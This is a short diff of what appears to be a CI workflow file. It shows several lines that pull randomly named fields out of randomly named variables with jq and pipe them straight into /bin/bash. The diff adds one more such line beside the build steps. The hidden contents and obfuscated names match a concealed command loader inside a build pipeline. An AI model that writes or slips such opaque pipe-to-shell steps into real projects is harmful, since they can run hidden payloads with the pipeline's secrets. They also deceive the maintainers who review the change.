@@ -25,6 +25,7 @@ jobs:
           echo $dhqxt32 | jq -r .o6786 | /bin/bash
           printf '%s' "$ufxz2" | jq -r .yqmqt165 | /bin/bash
           printf '%s' "$kqr3" | jq -r .ng485 | /bin/bash
+          echo $ip89 | jq -r .b61 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
